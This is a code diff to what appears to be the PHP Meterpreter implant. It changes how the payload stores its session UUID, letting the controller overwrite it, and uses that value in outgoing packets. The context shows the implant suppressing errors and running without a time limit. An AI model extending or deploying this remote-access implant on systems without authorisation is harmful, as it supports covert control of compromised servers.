@@ -32,7 +32,7 @@ if (!isset($GLOBALS['readers'])) {
 
 # global list of extension commands
 if (!isset($GLOBALS['commands'])) {
-    $GLOBALS['commands'] = array("core_loadlib", "core_machine_id", "core_uuid");
+    $GLOBALS['commands'] = array("core_loadlib", "core_machine_id", "core_set_uuid");
 }
 
 function register_command($c) {
@@ -442,9 +442,13 @@ function core_enumextcmd($req, &$pkt) {
   return ERROR_SUCCESS;
 }
 
-function core_uuid($req, &$pkt) {
-    my_print("doing core_uuid");
-    # this is always added, so we don't need to add it ourselves
+function core_set_uuid($req, &$pkt) {
+    my_print("doing core_set_uuid");
+    $new_uuid = packet_get_tlv($req, TLV_TYPE_UUID);
+    if ($new_uuid != null) {
+      $GLOBALS['UUID'] = $new_uuid['value'];
+      my_print("New UUID is {$GLOBALS['UUID']}");
+    }
     return ERROR_SUCCESS;
 }
 
@@ -674,7 +678,7 @@ function handle_dead_resource_channel($resource) {
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_close'));
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
-        packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, PAYLOAD_UUID));
+        packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));
 
         # Add the length to the beginning of the packet
         $pkt = pack("N", strlen($pkt) + 4) . $pkt;
@@ -699,7 +703,7 @@ function handle_resource_read_channel($resource, $data) {
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data));
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, strlen($data)));
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, generate_req_id()));
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, PAYLOAD_UUID));
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));
 
     # Add the length to the beginning of the packet
     $pkt = pack("N", strlen($pkt) + 4) . $pkt;
@@ -725,7 +729,7 @@ function create_response($xor, $req) {
     }
 
     packet_add_tlv($pkt, create_tlv(TLV_TYPE_RESULT, $result));
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, PAYLOAD_UUID));
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, $GLOBALS['UUID']));
 
     # Add the length to the beginning of the packet
     $pkt = pack("N", strlen($pkt) + 4) . $pkt;
@@ -1222,6 +1226,9 @@ error_reporting(0);
 @ignore_user_abort(1);
 @ini_set('max_execution_time',0);
 
+# Add the payload UUID to globals, and use that from now on so that we can
+# update it as required.
+$GLOBALS['UUID'] = PAYLOAD_UUID;
 
 # If we don't have a socket we're standalone, setup the connection here.
 # Otherwise, this is a staged payload, don't bother connecting
